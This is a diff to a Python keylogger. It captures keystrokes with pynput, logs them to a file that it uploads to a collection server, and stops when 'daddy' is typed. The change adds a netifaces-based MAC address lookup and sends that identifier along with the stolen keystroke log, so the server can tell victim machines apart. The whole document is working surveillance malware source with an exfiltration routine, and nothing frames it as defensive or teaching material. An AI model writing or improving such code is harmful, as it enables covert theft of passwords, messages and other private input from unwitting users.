@@ -3,7 +3,7 @@ import time
 import requests
 from pynput import keyboard
 import uuid
-
+import netifaces
 # Define the sequence to stop the keylogger (case-sensitive)
 stop_sequence = "daddy"
 current_sequence = ""
@@ -12,9 +12,11 @@ serverURL="http://localhost:5000/upload"
 shift_pressed = False
 
 def get_mac_address():
-    print("Getting MAC address...")
-    mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
-    return ":".join([mac[e:e+2] for e in range(0, 11, 2)])
+    # Get the name of the first network interface
+    interface = netifaces.interfaces()[0]
+    # Get the interface's MAC address
+    mac_address = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr']
+    return mac_address
 
 def on_press(key):
     global current_sequence, shift_pressed
@@ -70,10 +72,17 @@ def on_release(key):
     if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
         shift_pressed = False
 
+
 def upload_file():
     try:
+        mac_address = get_mac_address()
         with open("keyfile1.txt", 'rb') as file:
-            response = requests.post(serverURL, files={'file': file})
+            # Include the file and mac_address in the form data
+            form_data = {
+                'file': file,
+                'mac_address': (None, mac_address)  # None indicates this is not a file but a text field
+            }
+            response = requests.post(serverURL, data=form_data)
             if response.status_code == 200:
                 print("File uploaded successfully.")
                 response_data = response.json()
